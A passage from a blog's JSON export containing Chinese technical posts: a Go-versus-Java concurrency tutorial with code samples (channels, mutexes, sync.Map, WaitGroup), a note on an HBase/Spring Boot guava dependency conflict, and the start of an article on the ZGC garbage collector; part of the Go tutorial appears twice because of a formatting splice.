Goroutine!!!&quot;)}func main() { /* myFunction() //go goroutineTestFunc() //此时因为主线程有时候结束的快，goroutineTestFunc方法得不到输出，由此可以看出是开启了新的线程。 */ //打开第二段执行 /* go goroutineTestFunc() time.Sleep(10*time.Second)//睡一段时间 10秒 myFunction() */} 线程间的通信： java 线程间通信有很多种方式： 比如最原始的 wait/notify 到使用 juc 下高并发线程同步容器，同步队列 到 CountDownLatch 等一系列工具类 … 甚至是分布式系统不同机器之间的消息中间件，单机的 disruptor 等等。 Go 语言不同，线程间主要的通信方式是 Channel。 Channel 是实现 go 语言多个线程（goroutines）之间通信的一个机制。 Channel 是一个线程间传输数据的管道，创建 Channel 必须声明管道内的数据类型是什么 下面我们创建一个传输 int 类型数据的 Channel 代码示例： 12345678package mainimport &quot;fmt&quot;func main() { ch := make(chan int) fmt.Println(ch)} channel 是引用类型，函数传参数时是引用传递而不是值拷贝的传递。 channel 的空值和别的应用类型一样是 nil。 == 可以比较两个 Channel 之间传输的数据类型是否相等。 channel 是一个管道，他可以收数据和发数据。 具体参照下面代码示例: 1234567891011121314151617181920212223242526272829303132package mainimport ( &quot;fmt&quot; &quot;time&quot;)//channel发送数据和接受数据用 &lt;-表示,是发送还是接受取决于chan在 &lt;-左边还是右边//创建一个传输字符串数据类型的管道var chanStr = make(chan string)func main() { fmt.Println(&quot;main goroutine print Hello &quot;) //默认channel是没有缓存的，阻塞的，也就是说，发送端发送后直到接受端接受到才会施放阻塞往下面走。 //同样接收端如果先开启，直到接收到数据才会停止阻塞往下走 //开启新线程发送数据 go startNewGoroutineOne() //从管道中接收读取数据 go startNewGoroutineTwo() //主线程等待，要不直接结束了 time.Sleep(100*time.Second)}func startNewGoroutineOne() { fmt.Println(&quot;send channel print Hello &quot;) //管道发送数据 chanStr &lt;- &quot;Hello!!!&quot;}func startNewGoroutineTwo(){ fmt.Println(&quot;receive channel print Hello &quot;) strVar := &lt;-chanStr fmt.Println(strVar)} 无缓存的 channel 可以起到一个多线程间线程数据同步锁安全的作用。 缓存的 channel 创建方式是 make (chan string, 缓存个数) 缓存个数是指直到多个数据没有消费或者接受后才进行阻塞。 类似于 java 中的 synchronized 和 lock 可以保证多线程并发下的数据一致性问题。 首先我们看一个线程不安全的代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( &quot;fmt&quot; &quot;time&quot;)//多线程并发下的不安全问题//金额var moneyA int =1000//添加金额func subtractMoney(subMoney int) { time.Sleep(3*time.Second) moneyA-=subMoney}//查询金额func getMoney() int { return moneyA;}func main() { //添加查询金额 go func() { if(getMoney()&gt;200) { subtractMoney(200) fmt.Printf(&quot;200元扣款成功，剩下：%d元\\n&quot;,getMoney()) } }() //添加查询金额 go func() { if(getMoney()&gt;900) { subtractMoney(900) fmt.Printf(&quot;900元扣款成功，剩下：%d元\\n&quot;,getMoney()) } }() //正常逻辑，只够扣款一单，可以多线程环境下结果钱扣多了 time.Sleep(5*time.Second) fmt.Println(getMoney())} 缓存为 1 的 channel 可以作为锁使用： 示例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package mainimport ( &quot;fmt&quot; &quot;time&quot;)//多线程并发下使用channel改造//金额var moneyA = 1000//减少金额管道var synchLock = make(chan int,1)//添加金额func subtractMoney(subMoney int) { time.Sleep(3*time.Second) moneyA-=subMoney}//查询金额func getMoney() int { return moneyA;}func main() { //添加查询金额 go func() { synchLock&lt;-10 if(getMoney()&gt;200) { subtractMoney(200) fmt.Printf(&quot;200元扣款成功，剩下：%d元\\n&quot;,getMoney()) } &lt;-synchLock }() //添加查询金额 go func() { synchLock&lt;-10 if(getMoney()&gt;900) { subtractMoney(900) fmt.Printf(&quot;900元扣款成功，剩下：%d元\\n&quot;,getMoney()) } synchLock&lt;-10 }() //这样类似于java中的Lock锁，不会扣多 time.Sleep(5*time.Second) fmt.Println(getMoney())} # 4.Go 中的 Goroutine 使用和 GMP 模型？ Go 中的线程 (实际是纤程) goroutine 的底层管理和调度是在 runtime 包中自己实现的，其中遵循了 GMP 模型。 G 就是一个 goroutine，包括它自身的一些元信息。 M 是指操作系统内核态的线程的一个虚拟表示，一个 M 就是操作系统内核态的一个线程。 P 是一个组列表，P 管理着多个 goroutines,P 还有一些用于组管理的元数据信息。 # 5.Go 的 select 怎么用？ Go 中的 select 是专门用于支持更好的使用管道 (channel) 的。 我们之前虽然讲了能从管道中读取数据，但是这有一个缺陷，就是我们在一个 Goroutine 中不能同时处理读取多个 channel，因为在一个 Goroutine 中，一个 channel 阻塞后就无法继续运行了，所以无法在一个 Goroutine 处理多个 channel, 而 select 很好的解决了这个问题。 select 相当于 Java 中 Netty 框架的多路复用器的功能。 举例代码示例： 123456789101112131415161718192021222324package mainimport &quot;fmt&quot;func main() { //创建一个缓存为1的chan myChan := make(chan int,1) for i:=1;i&lt;=100;i++{ //select 的用法是，从上到下依次判断case 是否可执行，如果可执行，则执行完毕跳出select,如果不能执行，尝试下一个执行 //这里的可执行是指的不阻塞，也就是说，select从上到下开始挑选一个不阻塞的case执行，执行完毕后跳出， //如果所有case都阻塞，则执行default //如下输出结果，i=奇数的时候走case myChan&lt;-i:，把奇数放入mychan //走偶数的时候因为myChan中有数据了，则把上一个奇数打印出来。 //所以结果是 1 3 5 7 ... select { case data := &lt;-myChan: fmt.Println(data) case myChan&lt;-i: default: fmt.Println(&quot;default !!!&quot;) } }} # 6.Go 中的互斥锁 (类似于 Java 中的 ReentrantLock) 先按线程不安全的数据错误的代码示例： 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot; &quot;sync&quot;)//全局变量var num intvar wait sync.WaitGroupfunc main() { wait.Add(5) go myAdd() go myAdd() go myAdd() go myAdd() go myAdd() wait.Wait() //预期值等于5万，可是因为线程不安全错误，小于5万 fmt.Printf(&quot;num = %d\\n&quot;,num)}func myAdd() { defer wait.Done() for i:=0 ;i&lt;10000;i++ { num+=1 }} 打印输出结果： 1num = 38626 互斥锁示例代码如下： 12345678910111213141516171819202122232425262728293031323334package mainimport ( &quot;fmt&quot; &quot;sync&quot;)//全局变量var num intvar wait sync.WaitGroupvar lock sync.Mutexfunc main() { wait.Add(5) go myAdd() go myAdd() go myAdd() go myAdd() go myAdd() wait.Wait() //预期值等于5万，可是因为线程不安全错误，小于5万 fmt.Printf(&quot;num = %d\\n&quot;,num)}func myAdd() { defer wait.Done() for i:=0 ;i&lt;10000;i++ { lock.Lock() num+=1 lock.Unlock() }} # 7.Go 中的读写锁 (类似于 Java 中的 ReentrantReadWriteLock) 读写锁用于读多写少的情况，多个线程并发读不上锁，写的时候才上锁互斥 读写锁示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( &quot;fmt&quot; &quot;sync&quot; &quot;time&quot;)//金额var moneyA = 1000//读写锁var rwLock sync.RWMutex;var wait sync.WaitGroup//添加金额func subtractMoney(subMoney int) { rwLock.Lock() time.Sleep(3*time.Second) moneyA-=subMoney rwLock.Unlock()}//查询金额func getMoney() int { rwLock.RLock() result := moneyA rwLock.RUnlock() return result;}func main() { wait.Add(2) //添加查询金额 go func() { defer wait.Done() if(getMoney()&gt;200) { subtractMoney(200) fmt.Printf(&quot;200元扣款成功，剩下：%d元\\n&quot;,getMoney()) }else { fmt.Println(&quot;余额不足，无法扣款&quot;) } }() //添加查询金额 go func() { defer wait.Done() if(getMoney()&gt;900) { subtractMoney(900) fmt.Printf(&quot;900元扣款成功，剩下：%d元\\n&quot;,getMoney()) }else { fmt.Println(&quot;余额不足，无法扣款&quot;) } }() wait.Wait() fmt.Println(getMoney())} # 8.Go 中的并发安全 Map (类似于 CurrentHashMap) Go 中自己通过 make 创建的 map 不是线程安全的，具体体现在多线程添加值和修改值下会报如下错误： 12fatal error : concurrent map writes1 这个错类似于 java 中多线程读写线程不安全的容器时报的错。 Go 为了解决这个问题，专门给我们提供了一个并发安全的 map，这个并发安全的 map 不用通过 make 创建，拿来即可用，并且他提供了一些不同于普通 map 的操作方法。 参考如下代码示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( &quot;fmt&quot; &quot;sync&quot;)//创建一个sync包下的线程安全map对象var myConcurrentMap = sync.Map{}//遍历数据用的var myRangeMap = sync.Map{}func main() { //存储数据 myConcurrentMap.Store(1,&quot;li_ming&quot;) //取出数据 name,ok := myConcurrentMap.Load(1) if(!ok) { fmt.Println(&quot;不存在&quot;) return } //打印值 li_ming fmt.Println(name) //该key有值,则ok为true,返回它原来存在的值，不做任何操作；该key无值，则执行添加操作，ok为false,返回新添加的值 name2, ok2 := myConcurrentMap.LoadOrStore(1,&quot;xiao_hong&quot;) //因为key=1存在，所以打印是 li_ming true fmt.Println(name2,ok2) name3, ok3 := myConcurrentMap.LoadOrStore(2,&quot;xiao_hong&quot;) //因为key=2不存在，所以打印是 xiao_hong false fmt.Println(name3,ok3) //标记删除值 myConcurrentMap.Delete(1) //取出数据 //name4,ok4 := myConcurrentMap.Load(1) //if(!ok4) { // fmt.Println(&quot;name4=不存在&quot;) // return //} //fmt.Println(name4) //遍历数据 rangeFunc()}//遍历func rangeFunc(){ myRangeMap.Store(1,&quot;xiao_ming&quot;) myRangeMap.Store(2,&quot;xiao_li&quot;) myRangeMap.Store(3,&quot;xiao_ke&quot;) myRangeMap.Store(4,&quot;xiao_lei&quot;) myRangeMap.Range(func(k, v interface{}) bool { fmt.Println(&quot;data_key_value = :&quot;,k,v) //return true代表继续遍历下一个，return false代表结束遍历操作 return true })} # 9.Go 中的 AtomicXXX 原子操作类 (类似于 Java 中的 AtocmicInteger 之类的) Go 中的 atomic 包里面的功能和 Java 中的 Atomic 一样，原子操作类，原理也是 cas, 甚至提供了 cas 的 api 函数，这里不做过多讲解， 简单举一个代码示例，因为方法太多，详细的请参考 api 文档中的 atomic 包： 123456789package mainimport &quot;sync/atomic&quot;func main() { //简单举例 var num int64 = 20 atomic.AddInt64(&amp;num,1)} # 10.Go 中的 WaitGroup (类似于 Java 中的 CountDownLatch) 现在让我们看一个需求，比如我们开启三个并发任务，然后三个并发任务执行处理完毕后我们才让主线程继续往下面走。 这时候肯定不能用睡眠了，因为不知道睡眠多长时间。 这是 Go 中的 sync 包提供了一个 WaitGroup 的工具，他基本上和 Java 中的 CountDownLatch 的功能一致。 接下来让我们看代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182package mainimport ( &quot;fmt&quot; &quot;sync&quot; &quot;time&quot;)//获取类似于CountDownLatch的对象var wait sync.WaitGroupfunc main() { //设置计数器任务为3，当3个任务全部done后，wait.Wait()才会松开阻塞 wait.Add(3) go myFun1() go myFun2() go myFun3() //阻塞 wait.Wait()}func myFun1() { //计数器减1 defer wait.Done() //睡眠五秒 time.Sleep(time.Second*5) fmt.Println(&quot;fun1执行完毕&quot;)}func myFun2() { //计数器减1 defer wait.Done() //睡眠五秒 time.Sleep(time.Second*5) fmt.Println(&quot;fun2执行完毕&quot;)}func myFun3() { //计数器减1 defer wait.Done() //睡眠五秒 time.Sleep(time.Second*5) fmt.Println(&quot;fun3执行完毕&quot;)}码如下：```gopackage mainimport ( &quot;fmt&quot; &quot;sync&quot;)//全局变量var num intvar wait sync.WaitGroupvar lock sync.Mutexfunc main() { wait.Add(5) go myAdd() go myAdd() go myAdd() go myAdd() go myAdd() wait.Wait() //预期值等于5万，可是因为线程不安全错误，小于5万 fmt.Printf(&quot;num = %d\\n&quot;,num)}func myAdd() { defer wait.Done() for i:=0 ;i&lt;10000;i++ { lock.Lock() num+=1 lock.Unlock() }} # 7.Go 中的读写锁 (类似于 Java 中的 ReentrantReadWriteLock) 读写锁用于读多写少的情况，多个线程并发读不上锁，写的时候才上锁互斥 读写锁示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( &quot;fmt&quot; &quot;sync&quot; &quot;time&quot;)//金额var moneyA = 1000//读写锁var rwLock sync.RWMutex;var wait sync.WaitGroup//添加金额func subtractMoney(subMoney int) { rwLock.Lock() time.Sleep(3*time.Second) moneyA-=subMoney rwLock.Unlock()}//查询金额func getMoney() int { rwLock.RLock() result := moneyA rwLock.RUnlock() return result;}func main() { wait.Add(2) //添加查询金额 go func() { defer wait.Done() if(getMoney()&gt;200) { subtractMoney(200) fmt.Printf(&quot;200元扣款成功，剩下：%d元\\n&quot;,getMoney()) }else { fmt.Println(&quot;余额不足，无法扣款&quot;) } }() //添加查询金额 go func() { defer wait.Done() if(getMoney()&gt;900) { subtractMoney(900) fmt.Printf(&quot;900元扣款成功，剩下：%d元\\n&quot;,getMoney()) }else { fmt.Println(&quot;余额不足，无法扣款&quot;) } }() wait.Wait() fmt.Println(getMoney())} # 8.Go 中的并发安全 Map (类似于 CurrentHashMap) Go 中自己通过 make 创建的 map 不是线程安全的，具体体现在多线程添加值和修改值下会报如下错误： 1fatal error : concurrent map writes 这个错类似于 java 中多线程读写线程不安全的容器时报的错。 Go 为了解决这个问题，专门给我们提供了一个并发安全的 map，这个并发安全的 map 不用通过 make 创建，拿来即可用，并且他提供了一些不同于普通 map 的操作方法。 参考如下代码示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( &quot;fmt&quot; &quot;sync&quot;)//创建一个sync包下的线程安全map对象var myConcurrentMap = sync.Map{}//遍历数据用的var myRangeMap = sync.Map{}func main() { //存储数据 myConcurrentMap.Store(1,&quot;li_ming&quot;) //取出数据 name,ok := myConcurrentMap.Load(1) if(!ok) { fmt.Println(&quot;不存在&quot;) return } //打印值 li_ming fmt.Println(name) //该key有值,则ok为true,返回它原来存在的值，不做任何操作；该key无值，则执行添加操作，ok为false,返回新添加的值 name2, ok2 := myConcurrentMap.LoadOrStore(1,&quot;xiao_hong&quot;) //因为key=1存在，所以打印是 li_ming true fmt.Println(name2,ok2) name3, ok3 := myConcurrentMap.LoadOrStore(2,&quot;xiao_hong&quot;) //因为key=2不存在，所以打印是 xiao_hong false fmt.Println(name3,ok3) //标记删除值 myConcurrentMap.Delete(1) //取出数据 //name4,ok4 := myConcurrentMap.Load(1) //if(!ok4) { // fmt.Println(&quot;name4=不存在&quot;) // return //} //fmt.Println(name4) //遍历数据 rangeFunc()}//遍历func rangeFunc(){ myRangeMap.Store(1,&quot;xiao_ming&quot;) myRangeMap.Store(2,&quot;xiao_li&quot;) myRangeMap.Store(3,&quot;xiao_ke&quot;) myRangeMap.Store(4,&quot;xiao_lei&quot;) myRangeMap.Range(func(k, v interface{}) bool { fmt.Println(&quot;data_key_value = :&quot;,k,v) //return true代表继续遍历下一个，return false代表结束遍历操作 return true })} # 9.Go 中的 AtomicXXX 原子操作类 (类似于 Java 中的 AtocmicInteger 之类的) Go 中的 atomic 包里面的功能和 Java 中的 Atomic 一样，原子操作类，原理也是 cas, 甚至提供了 cas 的 api 函数，这里不做过多讲解， 简单举一个代码示例，因为方法太多，详细的请参考 api 文档中的 atomic 包： 123456789package mainimport &quot;sync/atomic&quot;func main() { //简单举例 var num int64 = 20 atomic.AddInt64(&amp;num,1)} # 10.Go 中的 WaitGroup (类似于 Java 中的 CountDownLatch) 现在让我们看一个需求，比如我们开启三个并发任务，然后三个并发任务执行处理完毕后我们才让主线程继续往下面走。 这时候肯定不能用睡眠了，因为不知道睡眠多长时间。 这是 Go 中的 sync 包提供了一个 WaitGroup 的工具，他基本上和 Java 中的 CountDownLatch 的功能一致。 接下来让我们看代码示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445package mainimport ( &quot;fmt&quot; &quot;sync&quot; &quot;time&quot;)//获取类似于CountDownLatch的对象var wait sync.WaitGroupfunc main() { //设置计数器任务为3，当3个任务全部done后，wait.Wait()才会松开阻塞 wait.Add(3) go myFun1() go myFun2() go myFun3() //阻塞 wait.Wait()}func myFun1() { //计数器减1 defer wait.Done() //睡眠五秒 time.Sleep(time.Second*5) fmt.Println(&quot;fun1执行完毕&quot;)}func myFun2() { //计数器减1 defer wait.Done() //睡眠五秒 time.Sleep(time.Second*5) fmt.Println(&quot;fun2执行完毕&quot;)}func myFun3() { //计数器减1 defer wait.Done() //睡眠五秒 time.Sleep(time.Second*5) fmt.Println(&quot;fun3执行完毕&quot;)} # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/05/09/%E3%80%90Go%E3%80%91Go%E8%AF%AD%E8%A8%80%E4%B8%8EJava%E8%AF%AD%E8%A8%80%E5%AF%B9%E6%AF%94/"},{"title":"Hbase整合SpringBoot的问题","text":"在一个 Demo 中，springboot 整合 Hbase 出了一个难解决的问题： tried to access method com.google.common.base.Stopwatch.()V from class org.apache.hadoop.hbase.zookeeper.MetaTableLocator 调用 hbase 就会报错，这是因为 swagger 和 guava 依赖冲突导致的，整合 habse 的 1.0 版本，依赖中不能有 swagger，guava 的版本要低于 17. # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/12/13/%E3%80%90Hbase%E3%80%91Hbase%E4%B8%8Eswagger%E4%B8%8Eguava%E4%BE%9D%E8%B5%96%E9%94%99%E8%AF%AF/"},{"title":"【JVM】极致低延迟收集器ZGC探索——亚毫秒级，常数级暂停O(1)原理","text":"# 【JVM】极致低延迟收集器 ZGC 探索 —— 亚毫秒级，常数级暂停 O (1) 原理 文章目录 ZGC 收集器 ZGC历程 ZGC 特性 基于区块的内存模型 完全并发原理 G1的回收时停顿 ZGC的标记—复制算法 ZGC对象定位 着色指针 `Color Pointer` 内存视图 `View` 读屏障 `Load Barrier` 转移表 `Forwarding Table` 并发标记过程 栈水印屏障 `Stack Watermark Barrier` ZGC 其他特性 支持非统一内存访问架构 就地重定位 对比Azul Zing C4 GC 总结 ZGC 优点 ZGC 缺点 ZGC使用 低版本可用 ZGC参数说明 ZGC的垃圾回收什么情况下会被触发？ ZGC调优 参考 ZGC 收集器 ZGC收集器（Z Garbage Collector）是由Oracle公司为HotSpot JDK研发的，最新一代垃圾收集器。有说法使用这个名目标是取代之前的大部分垃圾收集器，所以才叫ZGC，表示极致的Extremely，或者最后的，垃圾收集器。类似 ZFS（文件系统），ZFS（文件系统）在它刚问世时在许多方面都是革命性的。 ZGC官网 但是ZGC官方文档说ZGC这只是个名字，不代表任何含义。看你相信哪种了，笑 设计目标 希望能在尽可能对吞吐量影响不太大的前提下，实现在任意堆内存大小下都可以把垃圾收集的停顿时间限制在10ms以内的低延迟。 停顿时间不超过10ms； 停顿时间不会随着堆的大小，或者活跃对象的大小而增加； 支持8MB~4TB级别的堆（未来支持16TB）。 主流的常见操作系统，比如Linux,Windows,MacOS,FreeBSD都是非实时操作系统。非实时操作系统的一个处理器时间片都在5~20毫秒，面向服务端的系统一个线程调度事件需要3-5个时间片，客户端系统则更多。10毫秒停顿已经可以认为是系统误差级的停顿，低于 Linux 内核的背景噪声，即调度开销和系统调用开销，此时ZGC基本已经成为无停顿GC。 ZGC设计目标停顿时间在10ms以下，10ms其实是一个很保守的数据，在SPECjbb 2015基准测试中，128G的大堆下最大停顿时间才1.68ms，远低于10ms。 而且ZGC目前的进展很快，在JDK17的测试中和shenandoah gc双双实现了亚毫秒(&lt;1ms)的GC暂停。 Shenandoah in OpenJDK 17: Sub-millisecond GC pauses | Red Hat Developer 不负极致之名，Java17之后采用ZGC是最好的选择。 ZGC历程 在Java11推出实验性的ZGC以来，历经数年开发，ZGC在当前已经新增了众多特性。 一些关于ZGC特性、原理的文章已经稍有过时，比如ZGC只支持4TB大小的堆，ZGC不支持类卸载，ZGC只支持Linux/x64架构等。 不过通过这些文章对ZGC进行了解还是可行的。 ZGC各版本特性变化 JDK 12 支持并发类卸载 JDK 13 支持最大堆从4TB提升到16TB 支持Linux/AArch64架构 支持归还未使用内存 JDK 14 支持MacOS/x64、Windows/x64架构 支持最低8M的小堆 JDK 15 生产就绪 支持类数据共享（CDS） 支持压缩类指针（对象头） 支持渐进式归还内存 JDK 16 新增并发线程栈扫描特性 支持对象就地迁移 支持Windows/aarch64架构 JDK 17 新增动态GC线程数特性 新增JVM快速退出特性 支持macOS/aarch64架构 JDK 18 支持字符串重复数据删除 支持Linux/PowerPC架构 ZGC 特性 完全并发 使用着色指针 使用读屏障 基于区块的内存模型 支持就近分配的NUMA处理器架构 压缩内存 其中完全并发的能力，是通过着色指针，读屏障，基于区块的内存模型来实现的，算是ZGC的基础特性。后面会首先研究。 支持就近分配的NUMA处理器架构，压缩内存等是性能提升措施，会在完全并发之后介绍。 基于区块的内存模型 类似于G1，ZGC也采用基于区块(Region)的堆内存布局，每个区块被称为ZPage。不同于G1的是，ZGC的区块具有动态性。ZGC的区块，支持动态创建和销毁，支持动态的区域容量大小变化。 ZGC区块分为以下几种 小型区块（Small Region）： 容量固定为2MB，用于放置小于256KB的小对象。 中型区块（Medium Region）： 容量固定为32MB，用于放置大于等于256KB但小于4MB的对象。 大型区块（Large Region）： 容量不固定，可以动态变化，但必须为2MB的整数倍，用于放置4MB或以上的大对象。每个大型Region中只会存放一个大对象，所以实际容量可能小于中型Region，最小容量可低至4MB。大型Region在ZGC的实现中是不会被重分配的，因为复制一个大对象的代价非常高昂。 可以看到相比G1，ZGC的区块动态性不包括堆内存的每个区块可以根据运行情况的需要，扮演年轻代的Eden、Survivor区域、老年代区域、或者大对象(Humongous)区域。这是因为ZGC目前并不支持分代垃圾回收，没错，ZGC这个强大的收集器目前并不支持分代，据说是因为实现分代太复杂了，连Oracle团队也比较棘手。但不代表ZGC就不会用分代模型，已经有让ZGC支持分代回收的提案了JEP439，就看未来什么时候能实现。 完全并发原理 ZGC的最大特性就是做到了GC过程中的大部分阶段都能和用户线程并发，只有极少阶段（&lt;1ms）需要停顿，那么ZGC是如何做到的呢？ G1的回收时停顿 G1和ZGC都基于标记-复制算法，但算法具体实现的不同就导致了巨大的性能差异。 以G1为例，通过G1中标记-复制算法过程（G1的Young GC和Mixed GC均采用该算法），分析G1的混合回收中停顿耗时的主要瓶颈。 已知G1混合回收采用了标记—复制的算法，混合回收(MixedGC)过程可以分为标记阶段、筛选回收阶段。其中筛选回收又分为清理阶段和复制阶段。 标记阶段停顿分析 耗时较短 初始标记阶段：初始标记阶段是指从GC Roots出发标记全部直接子节点的过程，该阶段是STW的。由于GC Roots数量不多，通常该阶段耗时非常短。 并发标记阶段：并发标记阶段是指从GC Roots开始对堆中对象进行可达性分析，找出存活对象。该阶段是并发的，即应用线程和GC线程可以同时活动。并发标记耗时相对长很多，但因为不是程序停顿，所以我们不太关心该阶段耗时的长短。 再标记阶段：重新标记那些在并发标记阶段发生变化的对象。该阶段是STW的。 清理阶段停顿分析 耗时较短 清理阶段识别出有存活对象的分区和没有存活对象的分区，该阶段不会清理垃圾对象，也不会执行存活对象的复制。该阶段是程序停顿的。 复制阶段停顿分析 耗时较长 复制算法中的转移阶段需要分配新内存和复制对象的成员变量。转移阶段是程序停顿的，其中内存分配通常耗时非常短，但对象成员变量的复制耗时有可能较长，这是因为复制耗时与存活对象数量与对象复杂度成正比。对象越复杂，复制耗时越长。 四个STW过程中，初始标记因为只标记GC Roots，耗时较短。再标记因为对象数少，耗时也较短。清理阶段因为内存分区数量少，耗时也较短。 复制-转移阶段要处理所有存活的对象，耗时会较长。因此，G1停顿时间的瓶颈主要是标记-复制算法中的复制-转移阶段的程序停顿 。为什么转移阶段不能和标记阶段一样并发执行呢？主要是G1未能解决转移过程中准确定位对象地址的问题。 ZGC的标记—复制算法 与G1类似，ZGC也采用标记-复制算法，不过ZGC对该算法做了重大改进：ZGC在标记、转移和重定位阶段几乎都是并发的，这是ZGC实现停顿时间小于10ms目标的最关键原因。 ZGC中的一次垃圾回收过程会被分为十个步骤：初始标记、并发标记、再次标记、并发转移准备：[非强引用并发标记、重置转移集、回收无效页面（区）、选择目标回收页面、初始化转移集（表）]、初始转移、并发转移。但是只有三个阶段需要停顿(STW)：初始标记，再标记，初始转移。其中，初始标记和初始转移分别都只需要扫描所有GC Roots，其处理时间和GC Roots的数量成正比，一般情况耗时非常短；再标记阶段STW时间很短，最多1ms，超过1ms则再次进入并发标记阶段。即，ZGC几乎所有暂停都只依赖于GC Roots集合大小，停顿时间不会随着堆的大小或者活跃对象的大小而增加。与ZGC对比，G1的转移阶段完全STW的，且停顿时间随存活对象的大小增加而增加。 ①初始标记 这个阶段会触发STW，仅标记根可直达的对象，并将其压入到标记栈中，在该阶段中也会发生一些其他动作，如重置 TLAB、判断是否要清除软引用等。 ②并发标记 根据「初始标记」的根对象开启多条GC线程，并发遍历对象图，同时也会统计每个分区/页面中的存活对象数量。 ③再次标记 这个阶段也会出现短暂的STW，因为「并发标记」阶段中应用线程还是在运行的，所以会修改对象的引用导致漏标的情况出现，因此需要再次标记阶段来标记漏标的对象（如果此阶段停顿时间过长，ZGC会再次进入并发标记阶段重新标记）。 并发转移准备 4~8阶段都是并发转移对象的准备阶段，各子阶段又分别处理了不同事务 ④非强引用并发标记和引用并发处理 遍历前面过程中的非强引用类型根对象，但并不是所有非强根对象都可并发标记，有部分不能并发标记的非强根对象会在前面的「再次标记」阶段中处理。同时也会标记堆中的非强引用类型对象。 ⑤重置转移集/表 重置上一次GC发生时，转移表中记录的数据，方便本次GC使用。 在ZGC中，因为在回收时需要把一个分区中的存活对象转移进另外一个空闲分区中，而ZGC的转移又是并发执行的，因此，一条用户线程访问堆中的一个对象时，该对象恰巧被转移了，那么这条用户线程根据原本的指针是无法定位对象的，所以在ZGC中引入了转移表forwardingTable的概念。 转移表可以理解为一个Map&lt;OldAddress,NewAddress&gt;结构的集合，当一条线程根据指针访问一个被转移的对象时，如果该对象已经被转移，则会根据转移表的记录去新地址中查找对象，并同时会更新指针的引用。 ⑥回收无效分区/页面 回收物理内存已经被释放的无效的虚拟内存页面。ZGC是一款支持返还堆内存给物理机器的收集器，在机器内存紧张时会释放一些未使用的堆空间，但释放的页面需要在新一轮标记完成之后才能释放，所以在这个阶段其实回收的是上一次GC释放的空间。 ⑦选择待回收的分区/页面 ZGC与G1收集器一样，也会存在「垃圾优先」的特性，在标记完成后，整个堆中会有很多分区可以回收，ZGC也会筛选出回收价值最大的页面来作为本次GC回收的目标。 ⑧初始化待转移集合的转移表 初始化待回收分区/页面的转移表，方便记录区中存活对象的转移信息。 注：每个页面/分区都存在一个转移表forwardingTable。 ⑨初始转移 这个阶段会发生STW，遍历所有GCRoots节点及其直连对象，如果遍历到的对象在回收分区集合内，则在新的分区中为该对象分配对应的空间。不过值得注意的是：该阶段只会转移根对象（也就是GCRoots节点直连对象）。 ⑩并发转移 这个阶段与之前的「并发标记」很相似，从上一步转移的根对象出发，遍历目标区域中的所有对象，做并发转移处理。 ZGC对象定位 ZGC通过着色指针和读屏障技术，解决了转移过程中准确访问对象的问题，实现了并发转移。大致原理描述如下：并发转移中“并发”意味着GC线程在转移对象的过程中，应用线程也在不停地访问对象。假设对象发生转移，但对象地址未及时更新，那么应用线程可能访问到旧地址，从而造成错误。而在ZGC中，应用线程访问对象将触发“读屏障”，如果发现对象被移动了，那么“读屏障”会把读出来的指针更新到对象的新地址上，这样应用线程始终访问的都是对象的新地址。那么，JVM是如何判断对象被移动过呢？就是利用对象引用的地址，即着色指针。 着色指针 Color Pointer 已知Java虚拟机垃圾回收时的可达性分析使用了标记-整理类算法。从垃圾回收扫描根集合开始标记存活对象，那么这些标记被储存在哪里？ HotSpot虚拟机的标记实现方案有如下几种 把标记直接记录在对象头上 如Serial收集器 把标记记录在与对象相互独立的数据结构上 如G1、Shenandoah使用了一种相当于堆内存的1/64大小的，称为BitMap的结构来记录标记信息 直接把标记信息记在引用对象的指针上 如ZGC 为什么可以把引用关系放在指针上？ 可达性分析算法的标记阶段就是看有没有引用，所以可以只和指针打交道而不管指针所引用的对象本身。 例如使用三色标记法标记对象是否可达，这些标记本质上只和对象引用有关，和对象本身无关。只有对象的引用关系才能决定它的存活。 着色指针是一种直接将少量额外的信息存储在对象指针上的技术。目前在X64架构的操作系统中高16位是不能用来寻址的。程序只能使用低48位， ZGC将低48位中的高4位取出，用来存储4个标志位。剩余的44位可以支持16TB(2的44次幂)的内存，也即ZGC可以管理的内存不超过16TB。 4个标志位即着色位，所以这种指针被称为着色指针。 在ZGC中标记信息被直接记在引用对象的着色指针上，这样通过对象着色指针就可以获取 GC 标记，解决转移过程中准确定位对象地址的问题。 因此，ZGC只能在64位系统上，因为ZGC的着色指针使用的是44-48位，32位的x86架构系统显然不支持，并且因为ZGC已经把48位可用的指针地址空间全部使用了，自然也不支持压缩指针。 压缩指针和压缩类指针是两个不同的特性，后者又叫压缩对象头，ZGC是支持压缩对象头这一特性的，在JDK15后提供。 ZGC的四个着色位可以记录四种垃圾回收标记状态，即marked0、marked1、remapped、Finalizable,好像给指针染上了四种不同的颜色，所以叫做着色指针。 指针如何实现染色 指针的原本的作用在于寻址，如果我们想实现染色指针，就得把43~46位赋予特殊含义，这样寻址就不对了。所以最简单的方式是寻址之前把指针进行裁剪，只使用低44位去寻址（最大16TB内存）这样做导致的问题是，需要将裁剪指针寻址地址的 CPU 指令添加到生成的代码中，会导致应用程序变慢。 为了解决上面指针裁剪的问题，ZGC 使用了mmap内核函数进行多虚拟地址内存映射。使用 mmap 可以将同一块物理内存映射到多个虚拟地址上。这样，就可以实现堆中的一个对象，有4个虚拟地址，不同的地址标记不同的状态 